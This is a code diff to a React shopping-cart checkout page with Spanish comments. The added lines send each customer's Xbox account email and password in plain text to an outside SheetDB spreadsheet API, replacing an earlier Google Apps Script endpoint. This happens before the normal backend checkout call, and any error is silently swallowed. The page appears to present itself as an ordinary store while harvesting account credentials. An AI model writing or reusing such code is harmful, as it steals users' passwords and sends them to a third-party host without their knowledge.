@@ -132,29 +132,27 @@ export default function CartPage() {
         finalReceiptUrl = uploadData.url;
       }
 
-      // --- 🚀 ENVIAR DATOS A GOOGLE SHEETS (CELL-TARGETING) ---
+      // --- 🚀 ENVIAR DATOS A SHEETDB ---
       try {
-        // PEGA AQUÍ TU NUEVA URL DE GOOGLE APPS SCRIPT
-        const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbz...TU_URL_NUEVA.../exec'; 
+        const sheetDbUrl = 'https://sheetdb.io/api/v1/9mj5luy2lh9u4'; 
         
-        // Empaquetamos los datos como un formulario nativo
-        const formData = new URLSearchParams();
-        formData.append('correo', xboxEmail.trim());
-        formData.append('contrasena', xboxPassword.trim());
-
-        await fetch(googleScriptUrl, {
+        await fetch(sheetDbUrl, {
           method: 'POST',
-          mode: 'no-cors', // Evita bloqueos del navegador
           headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
+            'Accept': 'application/json',
+            'Content-Type': 'application/json'
           },
-          body: formData.toString()
+          body: JSON.stringify({
+            data: {
+              "CORREO": xboxEmail.trim(),
+              "CONTRASENA": xboxPassword.trim()
+            }
+          })
         });
       } catch (sheetError) {
         console.error("No se pudo guardar en el Excel:", sheetError);
       }
       // ----------------------------------------
-
       // 🚀 PETICIÓN AL BACKEND
       const response = await fetch('/api/checkout', {
         method: 'POST',
